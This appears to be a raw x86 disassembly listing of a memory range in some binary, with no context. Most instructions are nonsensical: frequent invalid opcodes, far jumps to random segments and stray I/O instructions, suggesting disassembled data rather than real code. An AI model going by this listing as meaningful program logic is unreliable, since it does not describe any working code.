  41c89d:	jl     0x41c8e4
  41c89f:	mov    esi,0x4f099b5d
  41c8a4:	lock ins BYTE PTR es:[edi],dx
  41c8a6:	cmp    BYTE PTR [ebp+ebx*4+0x7e],ah
  41c8aa:	xchg   ebx,eax
  41c8ab:	sub    dl,al
  41c8ad:	jno    0x41c918
  41c8af:	jnp    0x41c8c1
  41c8b1:	and    BYTE PTR [edx-0x3dbb5a3d],cl
  41c8b7:	(bad)  
  41c8b8:	xor    ah,BYTE PTR [ebp+0x64]
  41c8bb:	mov    bl,0x3d
  41c8bd:	das    
  41c8be:	mov    ?,WORD PTR [esi]
  41c8c0:	sub    BYTE PTR [edi-0x4f],al
  41c8c3:	arpl   si,sp
  41c8c5:	ss jbe 0x41c8c0
  41c8c8:	cwde   
  41c8c9:	dec    esi
  41c8ca:	test   ah,dh
  41c8cc:	stos   BYTE PTR es:[edi],al
  41c8cd:	push   edx
  41c8ce:	(bad)  
  41c8cf:	sbb    eax,DWORD PTR [ebp-0x2a]
  41c8d2:	lods   al,BYTE PTR ds:[esi]
  41c8d3:	xor    cl,bh
  41c8d5:	push   cs
  41c8d6:	das    
  41c8d7:	mov    ecx,0x2f96b493
  41c8dc:	jmp    0xb088:0xcaf7e8b3
  41c8e3:	sbb    bh,cl
  41c8e5:	xchg   ecx,eax
  41c8e6:	jl     0x41c966
  41c8e8:	xor    DWORD PTR ds:0x26940aab,ecx
  41c8ee:	jmp    0x8aec:0x9901cd8c
  41c8f5:	pop    ecx
  41c8f6:	jno    0x41c96e
  41c8f8:	cwde   
  41c8f9:	je     0x41c8c3
  41c8fb:	stc    
  41c8fc:	push   esi
  41c8fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c8fe:	ror    BYTE PTR [ebx+ebp*2+0x18],1
  41c902:	and    eax,0x98ffeed
  41c907:	jb     0x41c94a
  41c909:	inc    ebp
  41c90a:	xchg   edx,eax
  41c90b:	loop   0x41c93d
  41c90d:	(bad)  
  41c90f:	mov    WORD PTR [eax],cs
  41c911:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c912:	xchg   esp,eax
  41c913:	dec    ecx
  41c914:	(bad)  
  41c915:	aad    0xce
  41c917:	xchg   esp,eax
  41c918:	inc    ebp
  41c919:	jb     0x41c8d1
  41c91b:	or     cl,dl
  41c91d:	jb     0x41c8a4
  41c91f:	sar    BYTE PTR [ecx-0x60a7cc9c],0x6b
  41c926:	pop    ss
  41c927:	fwait
  41c928:	gs jp  0x41c92b
  41c92b:	push   ecx
  41c92c:	pushf  
  41c92d:	repnz pop esp
  41c92f:	add    eax,0xd06a553a
  41c934:	mov    bh,0xb2
  41c936:	pop    ecx
  41c937:	mov    bl,0x8e
  41c939:	add    edx,0x9fe2e94
  41c93f:	jb     0x41c936
  41c941:	imul   esi,DWORD PTR [ebp+0x5d],0xa4e778e8
  41c948:	aam    0x1a
  41c94a:	pop    ss
  41c94b:	and    edx,DWORD PTR [edx-0x65]
  41c94e:	pop    ds
  41c94f:	inc    esi
  41c950:	lods   al,BYTE PTR ds:[esi]
  41c951:	jae    0x41c944
  41c953:	das    
  41c954:	sbb    eax,0xac2c201a
  41c959:	stos   DWORD PTR es:[edi],eax
  41c95a:	pop    es
  41c95b:	push   es
  41c95c:	cmp    al,0xa0
  41c95e:	push   es
  41c95f:	fadd   QWORD PTR [edx+edx*4]
  41c962:	aam    0xb9
  41c964:	(bad)  [edx]
  41c966:	mov    esi,0xa5eea3b4
  41c96b:	jl     0x41c9d3
  41c96d:	icebp  
  41c96e:	mov    DWORD PTR [esp+eax*2],ebp
  41c971:	pushf  
  41c972:	cmp    DWORD PTR [ebx],esp
  41c974:	push   cs
  41c975:	sub    esi,DWORD PTR [edx+edx*2]
  41c978:	sbb    al,0x57
  41c97a:	fsub   DWORD PTR [edi+0x65691aaf]
  41c980:	adc    esi,edi
  41c982:	stos   BYTE PTR es:[edi],al
  41c983:	add    al,0xfb
  41c985:	sub    DWORD PTR [eax+0x564e7a2d],edx
  41c98b:	push   edi
  41c98c:	mov    bl,BYTE PTR ss:[ecx+0x5cc9998e]
  41c993:	fisttp DWORD PTR [eax-0x30cb52e]
  41c999:	fwait
  41c99a:	add    al,dl
  41c99c:	leave  
  41c99d:	(bad)  
  41c99e:	xchg   esi,eax
  41c99f:	lods   al,BYTE PTR ds:[esi]
  41c9a0:	sub    BYTE PTR [esi+esi*1-0x16c07023],bl
  41c9a7:	int    0x22
  41c9a9:	xor    ecx,edx
  41c9ab:	jno    0x41c9a5
  41c9ad:	xchg   edi,eax
  41c9ae:	jp     0x41c98d
  41c9b0:	xchg   ecx,eax
  41c9b1:	(bad)  
  41c9b2:	jge    0x41c967
  41c9b4:	test   ah,0x33
  41c9b7:	pop    ebp
  41c9b8:	dec    eax
  41c9b9:	dec    edx
  41c9ba:	dec    eax
  41c9bb:	xor    esi,DWORD PTR [eax]
  41c9bd:	xchg   edx,eax
  41c9be:	aas    
  41c9bf:	mov    BYTE PTR [edi+edi*2],bh
  41c9c2:	les    ecx,FWORD PTR [ecx]
  41c9c4:	popa   
  41c9c5:	pop    edi
  41c9c6:	or     dh,bl
  41c9c8:	mov    eax,0xdeaa24c3
  41c9cd:	fimul  WORD PTR [esp+eiz*4]
  41c9d0:	inc    ecx
  41c9d1:	repnz dec eax
  41c9d3:	inc    eax
  41c9d4:	mov    bl,BYTE PTR [edx-0x7]
  41c9d7:	cmp    BYTE PTR [ebx+0xf24bff4],ah
  41c9dd:	push   ecx
  41c9de:	push   cs
  41c9df:	sahf   
  41c9e0:	bound  eax,QWORD PTR [edi+0x50b2e1aa]
  41c9e6:	xchg   ebp,eax
  41c9e7:	leave  
  41c9e8:	mov    ah,0xf0
  41c9ea:	pop    edx
  41c9eb:	add    eax,0xd56d26c6
  41c9f0:	xchg   DWORD PTR [ebx+eiz*1-0x4d],esi
  41c9f4:	push   cs
  41c9f5:	daa    
  41c9f6:	mov    al,0x9d
  41c9f8:	cmp    dh,0x6e
  41c9fb:	gs out dx,al
  41c9fd:	or     bh,bh
  41c9ff:	test   BYTE PTR [edx-0x46],0xfd
  41ca03:	or     bh,BYTE PTR [eax+0x75]
  41ca06:	mov    dl,BYTE PTR [eax-0x33188f3d]
  41ca0c:	fadd   DWORD PTR [esi+0xa3ddd58]
  41ca12:	adc    al,0xca
  41ca14:	sub    eax,0xbfdcc649
  41ca19:	cs ja  0x41c9cc
  41ca1c:	call   0x9ef6:0x9ea4603e
  41ca23:	jge    0x41ca29
  41ca25:	arpl   WORD PTR [edi-0x704fd8dc],si
  41ca2b:	cs pop ebx
  41ca2d:	inc    edi
  41ca2e:	mov    edi,0x86840533
  41ca33:	ds mov al,0x37
  41ca36:	adc    eax,0x1164a3eb
  41ca3b:	aaa    
  41ca3c:	(bad)  
  41ca3d:	outs   dx,DWORD PTR ds:[esi]
  41ca3e:	je     0x41caaa
  41ca40:	mov    ebx,0xca9ea682
  41ca45:	icebp  
  41ca46:	loop   0x41c9e4
  41ca48:	inc    edx
  41ca49:	xor    eax,0x78d18f7c
  41ca4e:	sbb    DWORD PTR [ecx+edx*2-0x46686457],ecx
  41ca55:	mov    bl,0xbf
  41ca57:	loope  0x41ca9c
  41ca59:	je     0x41caad
  41ca5b:	jecxz  0x41ca29
  41ca5d:	imul   esp,ebx,0xffffffbb
  41ca60:	xchg   ebp,eax
  41ca61:	xchg   ebx,eax
  41ca62:	fbstp  TBYTE PTR [eax]
  41ca64:	js     0x41ca81
  41ca66:	iret   
  41ca67:	xor    edx,DWORD PTR [ebp-0x781f4f4a]
  41ca6d:	mov    ebx,DWORD PTR [ebx+ecx*2]
  41ca70:	leave  
  41ca71:	and    BYTE PTR [edi-0x2b162fb4],ah
  41ca77:	adc    eax,0x1f95ac7a
  41ca7c:	aaa    
  41ca7d:	clc    
  41ca7e:	int3   
  41ca7f:	jg     0x41ca6a
  41ca81:	pop    ds
  41ca82:	jecxz  0x41caff
  41ca84:	sti    
  41ca85:	clc    
  41ca86:	and    eax,0xe0bb3c68
  41ca8b:	out    0xda,eax
  41ca8d:	jb     0x41ca61
  41ca8f:	hlt    
  41ca90:	xchg   ecx,eax
  41ca91:	int    0xb7
  41ca93:	push   esp
  41ca94:	shl    esp,cl
  41ca96:	push   ebx
  41ca97:	std    
  41ca98:	dec    ebp
  41ca99:	out    dx,al
  41ca9a:	and    eax,0x39bbb31f
  41ca9f:	sar    DWORD PTR [ebp-0x7a],cl
  41caa2:	nop
  41caa3:	sub    ah,BYTE PTR [ecx+ebp*1-0x1]
  41caa7:	sub    DWORD PTR [edi],esp
  41caa9:	jb     0x41ca59
  41caab:	push   ds
  41caac:	sahf   
  41caad:	int3   
  41caae:	sbb    DWORD PTR [eax-0x16],esi
  41cab1:	enter  0x7dda,0xa9
  41cab5:	les    ecx,FWORD PTR [ebx]
  41cab7:	sbb    al,0x55
  41cab9:	out    dx,eax
  41caba:	mov    al,0xe1
  41cabc:	shr    DWORD PTR [edx+0x79],0xf3
  41cac0:	or     DWORD PTR [ecx],edx
  41cac2:	bound  ebp,QWORD PTR ss:[esi]
  41cac5:	in     eax,0x3f
  41cac7:	xchg   ecx,eax
  41cac8:	mov    al,ds:0x50f33c1b
  41cacd:	sub    bl,dh
  41cacf:	pop    ss
  41cad0:	pop    eax
  41cad1:	cmp    al,0xab
  41cad3:	jb     0x41cb2b
  41cad5:	ds mov edx,ecx
  41cad8:	and    BYTE PTR fs:[ecx],bh
  41cadb:	fst    QWORD PTR [edi+eiz*8-0x15d28d76]
  41cae2:	mov    ecx,0xfcadeeae
  41cae7:	sub    BYTE PTR [esi],bh
  41cae9:	xor    al,0x5b
  41caeb:	bound  ebp,QWORD PTR [ecx]
  41caed:	fidiv  WORD PTR [edx+edx*1-0x18bd3e3a]
  41caf4:	cmp    DWORD PTR [ebx+0x3e],0x420ea1b1
  41cafb:	xchg   edx,eax
  41cafc:	or     ebx,DWORD PTR [ecx+0x79]
  41caff:	sbb    ebx,ebx
  41cb01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb02:	ins    BYTE PTR es:[edi],dx
  41cb03:	sbb    BYTE PTR [eax-0x61473331],dh
  41cb09:	pop    ss
  41cb0a:	fnsave [ebp-0x51a48812]
  41cb10:	aaa    
  41cb11:	add    ebx,ecx
  41cb13:	cmp    BYTE PTR [eax],dh
  41cb15:	pusha  
  41cb16:	jae    0x41cb5f
  41cb18:	aaa    
  41cb19:	cmp    BYTE PTR [esi+0x38f5eae9],bh
  41cb1f:	mov    eax,ds:0xdb2ef072
  41cb24:	cmp    edx,DWORD PTR [ebx-0x4c8defa2]
  41cb2a:	jp     0x41cb4f
  41cb2c:	cmp    al,0xa3
  41cb2e:	and    al,0xe9
  41cb30:	(bad)  
  41cb31:	adc    al,0x4d
  41cb33:	sub    edx,ebp
  41cb35:	mov    edi,0xa7d72721
  41cb3a:	xchg   ecx,eax
  41cb3b:	jae    0x41cb07
  41cb3d:	fwait
  41cb3e:	int3   
  41cb3f:	arpl   WORD PTR es:[esi-0x5ec8fe9b],ax
  41cb46:	jnp    0x41cba0
  41cb48:	jno    0x41cb5a
  41cb4a:	jno    0x41cb5b
  41cb4c:	or     al,0x5d
  41cb4e:	pop    edi
  41cb4f:	pop    ss
  41cb50:	sub    DWORD PTR [ebx+eiz*8+0x29671545],esp
  41cb57:	fucom  st(4)
  41cb59:	mov    ds:0xb70d78e1,al
  41cb5e:	repnz loope 0x41cb0e
  41cb61:	jbe    0x41cb3d
  41cb63:	add    al,0xb4
  41cb65:	add    al,0xad
  41cb67:	fimul  WORD PTR [eax]
  41cb69:	lods   eax,DWORD PTR ds:[esi]
  41cb6a:	sbb    BYTE PTR [ebp+0x6c],ah
  41cb6d:	mov    bh,0x66
  41cb6f:	add    ebp,DWORD PTR [edx-0x22]
  41cb72:	lods   eax,DWORD PTR ds:[esi]
  41cb73:	mov    ah,0x27
  41cb75:	mov    WORD PTR [esi+0x48],?
  41cb78:	cs push cs
  41cb7a:	mov    ds:0xfa78698a,al
  41cb7f:	clc    
  41cb80:	sahf   
  41cb81:	jle    0x41cbc7
  41cb83:	es push 0xa
  41cb86:	inc    ebx
  41cb87:	fld    QWORD PTR [ebp+0x52996bee]
  41cb8d:	popa   
  41cb8e:	hlt    
  41cb8f:	xchg   esi,eax
  41cb90:	js     0x41cbd8
  41cb92:	aam    0x92
  41cb94:	int    0xdc
  41cb96:	out    0xd5,eax
  41cb98:	xchg   BYTE PTR [ecx-0x6d],bh
  41cb9b:	sbb    bh,0xec
  41cb9e:	mov    ebp,0x75eed660
  41cba3:	or     ecx,eax
  41cba5:	scas   al,BYTE PTR es:[edi]
  41cba6:	dec    eax
  41cba7:	mov    al,0x2f
  41cba9:	inc    ebx
  41cbaa:	test   DWORD PTR [ebx+ebx*1+0x706a1701],ecx
  41cbb1:	sbb    eax,0x77667f22
  41cbb6:	add    esi,edx
  41cbb8:	test   DWORD PTR [eax],ecx
  41cbba:	xor    ecx,DWORD PTR ds:0x9e18de75
  41cbc0:	pop    ss
  41cbc1:	jnp    0x41cbb0
  41cbc3:	fstp   QWORD PTR [eax]
  41cbc5:	not    DWORD PTR [ecx]
  41cbc7:	adc    DWORD PTR [ebx],edx
  41cbc9:	inc    ecx
  41cbca:	outs   dx,BYTE PTR ds:[esi]
  41cbcb:	imul   DWORD PTR [ecx-0x7a]
  41cbce:	mov    ebp,0x78e744be
  41cbd3:	or     esp,edx
  41cbd5:	push   eax
  41cbd6:	sar    BYTE PTR [ebp+0xbf4be17],0x42
  41cbdd:	inc    ecx
  41cbde:	ja     0x41cc55
  41cbe0:	das    
  41cbe1:	or     eax,0xaab8ba13
  41cbe6:	jmp    0x46c4:0xc0165845
  41cbed:	fst    QWORD PTR [edi*1-0x69a6d8b3]
  41cbf4:	popa   
  41cbf5:	cmp    eax,0x8cfddfe3
  41cbfa:	mov    esi,DWORD PTR es:[edx]
  41cbfd:	js     0x41cc77
  41cbff:	sbb    eax,0xfd8b3fa9
  41cc04:	ins    DWORD PTR es:[edi],dx
  41cc05:	cld    
  41cc06:	jmp    0x589bfff6
  41cc0b:	xchg   ebx,eax
  41cc0c:	daa    
  41cc0d:	aad    0x49
  41cc0f:	cmp    dl,dl
  41cc11:	lahf   
  41cc12:	(bad)  
  41cc13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc14:	dec    ebp
  41cc15:	test   BYTE PTR [edi],ch
  41cc17:	mov    ebp,DWORD PTR [ebp-0x50]
  41cc1a:	nop
  41cc1b:	and    BYTE PTR [eax+0x60],al
  41cc1e:	dec    edx
  41cc1f:	dec    ecx
  41cc20:	and    al,0x60
  41cc22:	mov    ecx,0x6e55b189
  41cc27:	into   
  41cc28:	in     eax,0x60
  41cc2a:	aaa    
  41cc2b:	mov    eax,0xa8d0cd5f
  41cc30:	loope  0x41cbe4
  41cc32:	mov    cl,bh
  41cc34:	out    dx,al
  41cc35:	jne    0x41cc91
  41cc37:	fistp  DWORD PTR [ebp-0x20]
  41cc3a:	push   0x14
  41cc3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc3d:	lahf   
  41cc3e:	jae    0x41cc09
  41cc40:	mov    ds:0xaea67ae3,al
  41cc45:	lea    ecx,[edi-0x630a5313]
  41cc4b:	(bad)  
  41cc4d:	push   0xffffff93
  41cc4f:	call   0xe625:0xd18d0c90
  41cc56:	sti    
  41cc57:	mov    ds:0xfacfc05a,eax
  41cc5c:	pop    ebp
  41cc5d:	sbb    bl,ah
  41cc5f:	dec    ebp
  41cc60:	xchg   esp,eax
  41cc61:	sub    ecx,DWORD PTR [edx+edi*1+0x530fdec7]
  41cc68:	dec    edi
  41cc69:	lahf   
  41cc6a:	jp     0x41ccdd
  41cc6c:	dec    esi
  41cc6d:	adc    eax,0x8fe9e06f
  41cc72:	inc    esi
  41cc73:	cli    
  41cc74:	mov    ebp,0x996e196e
  41cc79:	(bad)  
  41cc7b:	stc    
  41cc7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc7d:	icebp  
  41cc7e:	mov    BYTE PTR [ecx+edx*8],al
  41cc81:	shr    BYTE PTR [ecx],0xd
  41cc84:	and    ch,cl
  41cc86:	or     eax,0x9a6c1aff
  41cc8b:	cmp    esp,DWORD PTR [edx-0x7ac881d2]
  41cc91:	cmp    BYTE PTR [ecx-0x21d411df],ah
  41cc97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc98:	ror    BYTE PTR [edx],0xd5
  41cc9b:	dec    eax
  41cc9c:	aas    
  41cc9d:	out    dx,al
  41cc9e:	push   0x1ba5ba48
  41cca3:	fiadd  WORD PTR [eax-0x8]
  41cca6:	cld    
  41cca7:	jnp    0x41ccd8
  41cca9:	frstor [ebx+0x69]
  41ccac:	sbb    al,0x72
  41ccae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ccaf:	or     BYTE PTR [ecx+ecx*2+0xa997dae],bh
  41ccb6:	popa   
  41ccb7:	dec    edi
  41ccb8:	ror    al,1
  41ccba:	hlt    
  41ccbb:	rol    BYTE PTR [eax+esi*1+0x643914d5],1
  41ccc2:	pop    esi
  41ccc3:	and    BYTE PTR [ecx+0x7bd063],0x13
  41ccca:	jp     0x41ccdb
  41cccc:	and    BYTE PTR [eax],dh
  41ccce:	dec    esp
  41cccf:	push   ebx
  41ccd0:	rcr    BYTE PTR [ecx],0xc2
  41ccd3:	jecxz  0x41ccc6
  41ccd5:	(bad)  
  41ccd6:	gs scas al,BYTE PTR es:[edi]
  41ccd8:	add    al,0x83
  41ccda:	sbb    BYTE PTR ss:[ebx],bl
  41ccdd:	in     al,0x74
  41ccdf:	mov    edx,0xbb823774
  41cce4:	jns    0x41ccdb
  41cce6:	push   edi
  41cce7:	sbb    BYTE PTR [esi+0x145b575e],ch
  41cced:	icebp  
  41ccee:	dec    edi
  41ccef:	jge    0x41cd2f
  41ccf1:	and    eax,0xfecb119f
  41ccf6:	sbb    DWORD PTR [edx+0x4b],edi
  41ccf9:	call   0x9773284
  41ccfe:	sbb    DWORD PTR [ecx+eax*2+0x4b],ecx
  41cd02:	ret    
  41cd03:	mov    ebp,0xbe0ea7de
  41cd08:	bound  esp,QWORD PTR [ebx-0x47]
  41cd0b:	jg     0x41cd2b
  41cd0d:	(bad)  
  41cd0e:	not    BYTE PTR [edx+0x7c09583e]
  41cd14:	hlt    
  41cd15:	or     eax,ebp
  41cd17:	jo     0x41ccb6
  41cd19:	outs   dx,BYTE PTR ds:[esi]
  41cd1a:	adc    eax,0xc33d7978
  41cd1f:	aad    0xc9
  41cd21:	jo     0x41cd10
  41cd23:	and    BYTE PTR [edx-0x51355907],dl
  41cd29:	rcl    BYTE PTR [ebp-0x79],1
  41cd2c:	sub    eax,DWORD PTR [ebp-0x33]
  41cd2f:	jl     0x41ccf9
  41cd31:	pop    esi
  41cd32:	idiv   BYTE PTR [ecx+0x5ef86089]
  41cd38:	push   eax
  41cd39:	mov    BYTE PTR [eax+0xc7c745],bh
  41cd3f:	retf   0x5351
  41cd42:	xchg   edx,eax
  41cd43:	pop    ebx
  41cd44:	adc    BYTE PTR [ebx+0xf],al
  41cd47:	call   0x3f525cf7
  41cd4c:	mov    BYTE PTR [eax-0x18fc3737],0x5d
  41cd53:	jp     0x41cdcb
  41cd55:	push   esp
  41cd56:	sub    DWORD PTR [ecx+0x39],edx
  41cd59:	cld    
  41cd5a:	xor    bl,bh
  41cd5c:	sub    DWORD PTR [edi],eax
  41cd5e:	ins    DWORD PTR es:[edi],dx
  41cd5f:	adc    BYTE PTR [eax+0x3e],ch
  41cd62:	ss xchg ecx,eax
  41cd64:	jg     0x41cd3a
  41cd66:	dec    edi
  41cd67:	or     cl,BYTE PTR [ecx-0x29f339dc]
  41cd6d:	sbb    bh,BYTE PTR [eax+0x6]
  41cd70:	imul   esp,ebx,0x747771c4
  41cd76:	ins    DWORD PTR es:[edi],dx
  41cd77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd78:	dec    DWORD PTR ds:0xadc79fd9
  41cd7e:	xor    dh,BYTE PTR es:[eax]
  41cd81:	push   es
  41cd82:	mov    bl,BYTE PTR ds:0xb279a2ad
  41cd88:	push   edi
  41cd89:	je     0x41cde4
  41cd8b:	imul   ebx,DWORD PTR [ecx-0x49],0x50
  41cd8f:	aam    0x9e
  41cd91:	push   eax
  41cd92:	jb     0x41cd24
  41cd94:	xor    dl,ah
  41cd96:	sub    cl,ah
  41cd98:	call   0x4498:0x3fa8559b
  41cd9f:	fild   QWORD PTR [esi+0x2a]
  41cda2:	and    BYTE PTR [ebp+0x61],dl
  41cda5:	loopne 0x41cd40
  41cda7:	mov    ebp,0xf6440c8c
  41cdac:	sub    bh,BYTE PTR [ebx+0x91c44ec]
  41cdb2:	cmp    DWORD PTR [ecx+0x45],edx
  41cdb5:	jae    0x41cda7
  41cdb7:	cdq    
  41cdb8:	inc    edx
  41cdb9:	es popa 
  41cdbb:	mov    cl,0x63
  41cdbd:	and    ebp,ecx
  41cdbf:	jb     0x41cd9b
  41cdc1:	jae    0x41cd66
  41cdc3:	scas   eax,DWORD PTR es:[edi]
  41cdc4:	mov    ecx,ecx
  41cdc6:	pop    ecx
  41cdc7:	loopne 0x41cd9f
  41cdc9:	add    eax,DWORD PTR [esi+ecx*1-0x14]
  41cdcd:	mov    edx,0x4edd62d6
  41cdd2:	mov    eax,ds:0xeee66ce4
  41cdd7:	stos   BYTE PTR es:[edi],al
  41cdd8:	or     eax,0x63fcb1ed
  41cddd:	popa   
  41cdde:	adc    eax,0x4dbf1045
  41cde3:	xlat   BYTE PTR ds:[ebx]
  41cde4:	jne    0x41cdb7
  41cde6:	nop
  41cde7:	in     al,0x59
  41cde9:	shr    DWORD PTR [eax+0x1b],1
  41cdec:	ret    
  41cded:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  41cdef:	mov    ch,0x3f
  41cdf1:	sub    ecx,DWORD PTR [ecx+edx*1]
  41cdf4:	add    eax,0xc8651e1
  41cdf9:	or     dh,dl
  41cdfb:	push   0x85f86ec8
  41ce00:	mov    ebp,0x4c6ac5f8
  41ce05:	cld    
  41ce06:	clc    
  41ce07:	test   bh,bh
  41ce09:	inc    ebx
  41ce0a:	mov    bl,0x37
  41ce0c:	repnz call 0x918a:0x632d2ad8
  41ce14:	ins    DWORD PTR es:[edi],dx
  41ce15:	jo     0x41ce95
  41ce17:	scas   eax,DWORD PTR es:[edi]
  41ce18:	in     al,dx
  41ce19:	das    
  41ce1a:	add    DWORD PTR [edi-0xa10ff8f],ebx
  41ce20:	add    edi,edx
  41ce22:	push   di
  41ce24:	mov    eax,ds:0x460ce54a
  41ce29:	jge    0x41cdc1
  41ce2b:	retf   0x3153
  41ce2e:	idiv   DWORD PTR [esi+ebp*2-0x2b53ff2c]
  41ce35:	mov    ecx,0xf520e113
  41ce3a:	push   edi
  41ce3b:	mov    al,0x2b
  41ce3d:	add    eax,0x167681b9
  41ce42:	idiv   BYTE PTR [ebx+0x6233b027]
  41ce48:	cmp    esp,0xc794a41d
  41ce4e:	out    0x44,al
  41ce50:	dec    ebx
  41ce51:	sbb    BYTE PTR [ebp+0x4b],ch
  41ce54:	lock cdq 
  41ce56:	stos   BYTE PTR es:[edi],al
  41ce57:	or     eax,DWORD PTR [edi]
  41ce59:	push   edx
  41ce5a:	ret    
  41ce5b:	mov    ebp,0xdea9d3a6
  41ce60:	ret    0xb419
  41ce63:	mov    dh,0x62
  41ce65:	jge    0x41ce33
  41ce67:	dec    esp
  41ce68:	and    edx,edx
  41ce6a:	add    BYTE PTR [ebx+ecx*1-0x46],al
  41ce6e:	fwait
  41ce6f:	add    ebx,DWORD PTR ds:0x4907789e
  41ce75:	pop    esp
  41ce76:	cmp    ah,BYTE PTR [ebx+0x40e0e6b3]
  41ce7c:	sub    dl,dl
  41ce7e:	mov    ebx,0xf1407e30
  41ce83:	jge    0x41ce50
  41ce85:	pop    ss
  41ce86:	popa   
  41ce87:	sub    al,0x7d
  41ce89:	cmp    ebp,DWORD PTR [edi+edx*8]
  41ce8c:	add    eax,0xd4809c19
  41ce91:	(bad)  
  41ce92:	pop    ss
  41ce93:	inc    edi
  41ce94:	dec    ebp
  41ce95:	(bad)  
  41ce96:	into   
  41ce97:	ss jle 0x41cf12
  41ce9a:	cs mov esp,0x3eadf0d9
  41cea0:	and    ch,ah
  41cea2:	mov    ch,0x81
  41cea4:	not    dh
  41cea6:	fistp  DWORD PTR ds:0xb8f60e6
  41ceac:	into   
  41cead:	xchg   BYTE PTR [esi-0x12d6683],ah
  41ceb3:	(bad)  ds:0xa8c61dd9
  41ceb9:	push   0xffffff87
  41cebb:	xchg   esp,eax
  41cebc:	mov    ds:0x420841ec,al
  41cec1:	cdq    
  41cec2:	jo     0x41ce59
  41cec4:	adc    al,0x8e
  41cec6:	push   edx
  41cec7:	mov    ebx,0x63e524bf
  41cecc:	fisub  WORD PTR [ebp-0x4a]
  41cecf:	cmp    BYTE PTR [edx],dl
  41ced1:	ffreep st(1)
  41ced3:	iret   
  41ced4:	popf   
  41ced5:	fmul   QWORD PTR [ebp-0x1d]
  41ced8:	cmp    dl,cl
  41ceda:	push   edi
  41cedb:	push   ebx
  41cedc:	pusha  
  41cedd:	jecxz  0x41ce96
  41cedf:	xor    eax,0x2b3f187c
  41cee4:	repnz out 0x4f,eax
  41cee7:	sahf   
  41cee8:	iret   
  41cee9:	xchg   ebp,eax
  41ceea:	sub    eax,0x54208a17
  41ceef:	dec    ecx
  41cef0:	ffreep st(1)
  41cef2:	iret   
  41cef3:	push   0x59f38ef4
  41cef8:	scas   al,BYTE PTR es:[edi]
  41cef9:	in     al,0x9e
  41cefb:	adc    BYTE PTR [ebp-0xb8493],dl
  41cf01:	fldcw  WORD PTR [ebp-0xe93dd1b]
  41cf07:	les    edx,FWORD PTR [edx+0x9]
  41cf0a:	mov    ds:0x2fef1ab2,al
  41cf0f:	mov    eax,ds:0xb8d53e8b
  41cf14:	popf   
  41cf15:	xchg   DWORD PTR [edi-0x56],ecx
  41cf18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf19:	call   0x5e4b9b24
  41cf1e:	shl    cl,0xdc
  41cf21:	stc    
  41cf22:	sub    cl,bl
  41cf24:	daa    
  41cf25:	fld    QWORD PTR [esi+edx*1-0x2d]
  41cf29:	xor    DWORD PTR [ebx+0x1cfa723d],0xaf3153f4
  41cf33:	popf   
  41cf34:	loop   0x41cf9a
  41cf36:	repnz mov edi,0x3484cd3b
  41cf3c:	xchg   esp,eax
  41cf3d:	fcom   DWORD PTR [esi-0x49]
  41cf40:	inc    ebx
  41cf41:	mov    ds:0x4816ef,eax
  41cf46:	mov    eax,ds:0xeb1019e
  41cf4b:	pop    es
  41cf4c:	call   0xe859:0xfa4b0010
  41cf53:	cmp    ebx,edi
  41cf55:	outs   dx,BYTE PTR ds:[esi]
  41cf56:	stos   DWORD PTR es:[edi],eax
  41cf57:	pop    esp
  41cf58:	mov    al,0x68
  41cf5a:	cmp    ebp,DWORD PTR [ebx-0x3b5d81e8]
  41cf60:	fwait
  41cf61:	mov    esi,DWORD PTR [ebp+0x5b815720]
  41cf67:	les    edi,FWORD PTR [ecx+0x6d]
  41cf6a:	jne    0x41cf24
  41cf6c:	mov    esp,0x1a827a72
  41cf71:	hlt    
  41cf72:	jg     0x41cf4a
  41cf74:	mov    ebp,0x6a955abe
  41cf79:	adc    ebx,DWORD PTR [esi]
  41cf7b:	jnp    0x41cfca
  41cf7d:	jmp    0xaf602cf8
  41cf82:	cld    
  41cf83:	mov    ecx,0x88f0812
  41cf88:	popf   
  41cf89:	je     0x41cfc5
  41cf8b:	jnp    0x41cfde
  41cf8d:	dec    edi
  41cf8e:	xor    eax,0x4e87319e
  41cf93:	int    0xb0
  41cf95:	fnsave [esp+ebp*1]
  41cf98:	popa   
  41cf99:	jae    0x41cf78
  41cf9b:	mov    dh,0xa5
  41cf9d:	inc    esp
  41cf9e:	out    dx,eax
  41cf9f:	outs   dx,DWORD PTR ds:[esi]
  41cfa0:	mov    eax,ds:0x307a7045
  41cfa5:	loopne 0x41d026
  41cfa7:	and    al,0x11
  41cfa9:	repz mov ebx,0xd4a66115
  41cfaf:	cmp    al,0x56
  41cfb1:	mov    ch,0xb1
  41cfb3:	aam    0x5c
  41cfb5:	outs   dx,BYTE PTR ds:[esi]
  41cfb6:	inc    esp
  41cfb7:	scas   eax,DWORD PTR es:[edi]
  41cfb8:	aad    0xe8
  41cfba:	push   esi
  41cfbb:	clc    
  41cfbc:	leave  
  41cfbd:	xor    DWORD PTR [ecx],0x5ae02c3
  41cfc3:	jmp    0x1375:0x5577da95
  41cfca:	(bad)  [esi-0x1b]
  41cfcd:	add    al,0xd5
  41cfcf:	test   al,0x5e
  41cfd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cfd2:	lahf   
  41cfd3:	sbb    DWORD PTR [esp+edx*4+0xccffd7d],edi
  41cfda:	pop    ebx
  41cfdb:	loope  0x41cfbb
  41cfdd:	cmp    eax,0x6774aba4
  41cfe2:	(bad)  
  41cfe3:	ds pop eax
  41cfe5:	stc    
  41cfe6:	ins    DWORD PTR es:[edi],dx
  41cfe7:	repz push 0x6fec8e67
  41cfed:	lods   eax,DWORD PTR ds:[esi]
  41cfee:	xor    DWORD PTR [ecx+0x6f33eeda],edi
  41cff4:	inc    ebx
  41cff5:	retf   0x5e84
  41cff8:	ins    DWORD PTR es:[edi],dx
  41cff9:	jo     0x41d076
  41cffb:	jg     0x41cf8d
  41cffd:	xor    al,0xb9
  41cfff:	pop    ecx
  41d000:	dec    eax
